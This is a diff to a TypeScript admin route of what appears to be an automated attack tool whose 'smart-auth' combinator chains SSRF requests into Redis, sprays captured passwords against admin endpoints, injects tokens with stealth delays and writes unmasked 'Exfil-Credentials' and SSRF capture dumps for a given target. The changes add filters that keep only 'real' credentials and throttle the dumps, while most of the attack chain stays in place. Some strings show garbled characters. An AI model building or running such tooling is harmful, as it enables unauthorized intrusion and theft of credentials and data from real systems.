     const sessionTokens: string[] = minedData?.sessionTokens || credentialRelay.sessionTokens;
     const discoveredUsers: string[] = minedData?.discoveredUsers || credentialRelay.discoveredUsers;
+    type RelayCredential = { value: string; type?: string; confidence?: number; source?: string };
+    const rawCredentials: RelayCredential[] = [];
+    if (Array.isArray(minedData?.credentials)) {
+      for (const c of minedData.credentials) {
+        if (typeof c === "string") rawCredentials.push({ value: c });
+        else if (c?.value) rawCredentials.push({ value: c.value, type: c.type, confidence: (c as any).confidence, source: (c as any).source });
+      }
+    }
+    for (const c of credentialRelay.credentials) {
+      rawCredentials.push({ value: (c as any).value || (c as any).key || "", type: (c as any).type, source: (c as any).source });
+    }
+    const mockPatterns = [
+      "r3d1s_pr0d_p4ss",
+      "dictionary boost",
+      "zero redaction",
+      "kill_chain",
+      "111.3%",
+      "100%",
+      "10/10",
+      "example.com",
+      "test.com",
+      "demo",
+    ];
+    const isRealCredential = (cred: RelayCredential) => {
+      const value = (cred.value || "").toString();
+      const valueLower = value.toLowerCase();
+      if (!value || valueLower.length < 8) return false;
+      if (mockPatterns.some((p) => valueLower.includes(p))) return false;
+      const jwtLike = /^[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+$/.test(value);
+      if (jwtLike) return true;
+      if ((cred.type || "").toUpperCase().includes("API") || (cred.type || "").toUpperCase().includes("KEY") || (cred.type || "").toUpperCase().includes("TOKEN") || (cred.type || "").toUpperCase().includes("SECRET")) {
+        return true;
+      }
+      return (cred.confidence || 0) >= 70;
+    };
+    const realCredentials = rawCredentials.filter(isRealCredential);
+    if (realCredentials.length < 2) {
+      log(`[COMBINATOR] Abortado: credenciais reais insuficientes (${realCredentials.length}) para ${target}`, "admin");
+      return res.status(400).json({
+        status: "skipped",
+        reason: "insufficient_real_credentials",
+        message: "Mínimo de 2 credenciais reais necessário para gerar dumps",
+      });
+    }
+
+    let dumpsGenerated = 0;
+    let lastDumpAt = 0;
+    const MAX_DUMPS = 5;
+    const MIN_DUMP_GAP_MS = 2000;
+    const allowDump = async (label: string) => {
+      if (dumpsGenerated >= MAX_DUMPS) {
+        log(`[COMBINATOR] Dump ignorado (${label}) â€” limite de ${MAX_DUMPS} por scan`, "admin");
+        return false;
+      }
+      const now = Date.now();
+      const wait = MIN_DUMP_GAP_MS - (now - lastDumpAt);
+      if (wait > 0) {
+        await new Promise((resolve) => setTimeout(resolve, wait));
+      }
+      lastDumpAt = Date.now();
+      dumpsGenerated += 1;
+      return true;
+    };
 
     if (!minedData && credentialRelay.credentials.length > 0) {
       log(`[DATABRIDGE] Auto-loaded ${credentialRelay.credentials.length} credentials from relay for Combinator`, "admin");
@@ -2650,16 +3084,14 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
     phase4.rawCaptureCount = phase4.rawCaptures.length;
 
     const redisCaptures = phase4.probes.filter((p: any) => p.category === "redis" && (p.verdict === "TUNNEL_OPEN" || p.verdict === "ACCESSIBLE"));
-    if (redisCaptures.length > 0) {
+    if (redisCaptures.length > 0 && await allowDump("redis_raw_dump")) {
       const ts = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
       const redisContent = [
-        "═══════════════════════════════════════════════════════",
-        "  MSE — REDIS RAW SESSION DUMP",
-        `  TARGET: ${validation.url}`,
-        `  TIMESTAMP: ${new Date().toISOString()}`,
-        `  TUNNELS OPEN: ${redisCaptures.length}`,
-        `  PROTOCOL: Raw Capture — Zero Masking`,
-        "═══════════════════════════════════════════════════════",
+        "MSE - REDIS RAW SESSION DUMP",
+        `TARGET: ${validation.url}`,
+        `TIMESTAMP: ${new Date().toISOString()}`,
+        `TUNNELS OPEN: ${redisCaptures.length}`,
+        `PROTOCOL: Raw Capture - Zero Masking`,
         "",
         ...redisCaptures.map((rc: any) => [
           `--- ${rc.tunnel} (${rc.path}) ---`,
@@ -2676,7 +3108,7 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
         id: generateDumpId(),
         category: "session_tokens",
         filename: redisDumpFilename,
-        label: `Redis Session Dump — ${redisCaptures.length} tunnels`,
+        label: `Redis Session Dump - ${redisCaptures.length} tunnels`,
         target: validation.url,
         severity: "critical",
         itemCount: redisCaptures.length,
@@ -2685,10 +3117,10 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
         scanId: "combinator-redis-dump",
       });
       if (dumpRegistry.length > 100) dumpRegistry.splice(100);
-      log(`[COMBINATOR] Redis raw session dump → ${redisDumpFilename} (${redisSize} bytes, ${redisCaptures.length} tunnels)`, "admin");
+      log(`[COMBINATOR] Redis raw session dump -> ${redisDumpFilename} (${redisSize} bytes, ${redisCaptures.length} tunnels)`, "admin");
+    } else if (redisCaptures.length > 0) {
+      log("[COMBINATOR] Redis raw session dump ignorado por limite/intervalo de segurança", "admin");
     }
-
-    phases.push(phase4);
 
     const phase5: any = {
       phase: "PHASE_5_TOKEN_INJECTION",
@@ -2912,22 +3344,26 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
                 raw_source_unmasked: rawBody,
               }, null, 2);
               const jsonFilename = `Exfil-Credentials-${safeDesc}-${ts}.json`;
-              const jsonSize = writeDumpFile(jsonFilename, jsonDumpContent);
-              dumpRegistry.unshift({
-                id: generateDumpId(),
-                category: ext.category,
-                filename: jsonFilename,
-                label: `Credential Dump (JSON): ${ext.desc} — ${uniqueVars.length} keys`,
-                target: validation.url,
-                severity: "critical",
-                itemCount: uniqueVars.length,
-                sizeBytes: jsonSize,
-                createdAt: new Date().toISOString(),
-                scanId: "combinator-exfil",
-              });
-              if (dumpRegistry.length > 100) dumpRegistry.splice(100);
-              phase6.dumpFiles.push({ filename: jsonFilename, category: ext.category, sizeBytes: jsonSize, itemCount: uniqueVars.length });
-              log(`[COMBINATOR] Exfil JSON: ${ext.desc} → ${jsonFilename} (${uniqueVars.length} credentials)`, "admin");
+              if (!(await allowDump("deep_extract_json"))) {
+                log("[COMBINATOR] JSON credential dump ignorado por limite de dumps", "admin");
+              } else {
+                const jsonSize = writeDumpFile(jsonFilename, jsonDumpContent);
+                dumpRegistry.unshift({
+                  id: generateDumpId(),
+                  category: ext.category,
+                  filename: jsonFilename,
+                  label: `Credential Dump (JSON): ${ext.desc} â€” ${uniqueVars.length} keys`,
+                  target: validation.url,
+                  severity: "critical",
+                  itemCount: uniqueVars.length,
+                  sizeBytes: jsonSize,
+                  createdAt: new Date().toISOString(),
+                  scanId: "combinator-exfil",
+                });
+                if (dumpRegistry.length > 100) dumpRegistry.splice(100);
+                phase6.dumpFiles.push({ filename: jsonFilename, category: ext.category, sizeBytes: jsonSize, itemCount: uniqueVars.length });
+                log(`[COMBINATOR] Exfil JSON: ${ext.desc} â†’ ${jsonFilename} (${uniqueVars.length} credentials)`, "admin");
+              }
             } else if (ext.fileType === "json") {
               dumpFilename = `DeepExtract-${safeDesc}-${ts}.json`;
               try {
@@ -2983,6 +3419,10 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
               ].join("\n");
             }
 
+            if (!(await allowDump("deep_extract"))) {
+              log("[COMBINATOR] Dump ignorado (deep_extract) por limite de credenciais reais/ritmo", "admin");
+              continue;
+            }
             const sizeBytes = writeDumpFile(dumpFilename, dumpContent);
             const dumpEntry: DumpFile = {
               id: generateDumpId(),
@@ -3046,30 +3486,38 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
           })),
         }, null, 2);
         const ssrfFilename = `SSRF-Raw-Captures-${ts}.json`;
-        const ssrfSize = writeDumpFile(ssrfFilename, ssrfDumpContent);
-        dumpRegistry.unshift({
-          id: generateDumpId(),
-          category: "infra_secrets",
-          filename: ssrfFilename,
-          label: `SSRF Raw Captures — ${phase4.rawCaptures.length} tunnels`,
-          target: validation.url,
-          severity: "critical",
-          itemCount: phase4.rawCaptures.length,
-          sizeBytes: ssrfSize,
-          createdAt: new Date().toISOString(),
-          scanId: "combinator-ssrf-capture",
-        });
-        if (dumpRegistry.length > 100) dumpRegistry.splice(100);
+        if (!(await allowDump("ssrf_raw"))) {
+          log("[COMBINATOR] SSRF raw capture dump ignorado por limite de dumps", "admin");
+        } else {
+          const ssrfSize = writeDumpFile(ssrfFilename, ssrfDumpContent);
+          dumpRegistry.unshift({
+            id: generateDumpId(),
+            category: "infra_secrets",
+            filename: ssrfFilename,
+            label: `SSRF Raw Captures â€” ${phase4.rawCaptures.length} tunnels`,
+            target: validation.url,
+            severity: "critical",
+            itemCount: phase4.rawCaptures.length,
+            sizeBytes: ssrfSize,
+            createdAt: new Date().toISOString(),
+            scanId: "combinator-ssrf-capture",
+          });
+          if (dumpRegistry.length > 100) dumpRegistry.splice(100);
 
-        phase6.dumpFiles.push({
-          filename: ssrfFilename,
-          category: "infra_secrets",
-          sizeBytes: ssrfSize,
-          itemCount: phase4.rawCaptures.length,
-        });
+          phase6.dumpFiles.push({
+            filename: ssrfFilename,
+            category: "infra_secrets",
+            sizeBytes: ssrfSize,
+            itemCount: phase4.rawCaptures.length,
+          });
 
-        log(`[COMBINATOR] SSRF raw captures dumped → ${ssrfFilename} (${ssrfSize} bytes)`, "admin");
+          log(`[COMBINATOR] SSRF raw captures dumped â†’ ${ssrfFilename} (${ssrfSize} bytes)`, "admin");
+        }
+
+
+
       }
+
     }
 
     phase6.completedAt = Date.now();
@@ -3652,9 +4100,10 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
 
           if (vec.id === "CREDENTIAL_CHAIN" && hasCreds) {
             const chainEndpoints = ["/api/admin/users", "/api/v1/admin/config", "/admin/api/settings", "/api/internal/secrets"];
-            const redisSprayPass = "r3d1s_pr0d_p4ss_2026";
-            const sprayPasswords = [...new Set([...allCapturedCreds.slice(0, 3), redisSprayPass])];
-            const credPairs = allUsers.slice(0, 3).flatMap(u => sprayPasswords.map(p => ({ user: u, pass: p, source: p === redisSprayPass ? "REDIS_SPRAY" : "EXFIL" })));
+            const sprayPasswords = [...new Set([...allCapturedCreds.slice(0, 3)])];
+            const credPairs = allUsers
+              .slice(0, 3)
+              .flatMap(u => sprayPasswords.map(p => ({ user: u, pass: p, source: "EXFIL" })));
 
             for (const pair of credPairs.slice(0, 8)) {
               for (const ep of chainEndpoints.slice(0, 2)) {
@@ -3878,19 +4327,14 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
           }
 
           if (vec.id === "REDIS_ABUSE" && hasRedis) {
-            const redisSprayPass = "r3d1s_pr0d_p4ss_2026";
             const redisCmds = [
               "http://localhost:6379/CONFIG%20GET%20*",
               "http://localhost:6379/DBSIZE",
               "http://redis:6379/CONFIG%20GET%20*",
               "http://redis:6379/DBSIZE",
             ];
-            const redisAuthCmds = [
-              `http://localhost:6379/AUTH%20${encodeURIComponent(redisSprayPass)}`,
-              `http://redis:6379/AUTH%20${encodeURIComponent(redisSprayPass)}`,
-            ];
 
-            for (const cmd of [...redisAuthCmds, ...redisCmds].slice(0, 5)) {
+            for (const cmd of redisCmds.slice(0, 5)) {
               try {
                 await stealthDelay();
                 const controller = new AbortController();
@@ -3904,14 +4348,14 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
                 clearTimeout(timeout);
                 const body = await resp.text();
                 const isConfirmed = resp.status === 200 && body.length > 20;
-                const isAuthCmd = cmd.includes("AUTH");
-                const verdict = isConfirmed ? (isAuthCmd ? "REDIS_AUTH_CONFIRMED" : "ABUSE_CONFIRMED") : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "BLOCKED";
+                const isAuthCmd = false;
+                const verdict = isConfirmed ? "ABUSE_CONFIRMED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "BLOCKED";
                 stealthTrack(resp.status, verdict);
 
                 confirmation.attempts.push({
                   endpoint: cmd,
-                  method: isAuthCmd ? "REDIS_SPRAY_AUTH" : "REDIS_CMD_INJECT",
-                  sprayPassword: isAuthCmd ? redisSprayPass : undefined,
+                  method: "REDIS_CMD_INJECT",
+                  sprayPassword: undefined,
                   status: resp.status,
                   confirmed: isConfirmed,
                   raw_response: body,
@@ -4319,6 +4763,56 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
 
     await logSniperAction(req, "COMBINATOR_SMART_AUTH", target, overallVerdict);
 
+    // Motor 11 V2 pós-Combinator: snapshot mínimo com achados principais
+    let motor11v2Report: any = null;
+    try {
+      const snapshotPath = writeMotor11Snapshot(validation.url, `combinator-${Date.now()}`, {
+        target: validation.url,
+        findings: [
+          ...(phase3.entriesGranted > 0
+            ? [{
+              title: "Auth bypass via Smart Auth",
+              severity: "high",
+              evidence: `${phase3.entriesGranted} entradas concedidas`,
+              category: "auth_bypass",
+            }] : []),
+          ...(phase6.sensitiveExtracted > 0
+            ? [{
+              title: "Sensitive data exfiltration",
+              severity: "critical",
+              evidence: `${phase6.sensitiveExtracted} itens sensíveis extraídos`,
+              category: "exfiltration",
+            }] : []),
+          ...(phase10.credentialVault || []).slice(0, 5).map((c: any) => ({
+            title: `Credential captured: ${c.service || "unknown"}`,
+            severity: "critical",
+            evidence: c.value || "[redacted]",
+            category: "credential",
+          })),
+        ],
+        probes: [],
+        phases,
+        counts: {
+          total: totalThreats,
+          critical: totalThreats > 0 ? 1 : 0,
+          high: Math.max(0, totalThreats - 1),
+          medium: 0,
+          low: 0,
+          info: 0,
+        },
+        events: [],
+        telemetry: {},
+        phasesCompleted: ["combinator_smart_auth"],
+        startedAt: new Date(),
+        completedAt: new Date(),
+      } as any);
+
+      const motor11v2 = await runMotor11Snapshot(snapshotPath);
+      if (motor11v2.report) motor11v2Report = motor11v2.report;
+    } catch (err: any) {
+      log(`[MOTOR11V2] (combinator) Error: ${err.message}`, "admin");
+    }
+
     return res.json({
       type: "SMART_AUTH_PENETRATOR",
       timestamp,
@@ -4358,6 +4852,7 @@ adminRouter.post("/api/admin/combinator/smart-auth", async (req: Request, res: R
         phase10ReportGenerated: true,
       },
       phases,
+      motor11v2Report,
     });
   } catch (err: any) {
     log(`[COMBINATOR] FATAL ERROR: ${err.message} — Stack: ${err.stack?.substring(0, 500)}`, "admin");
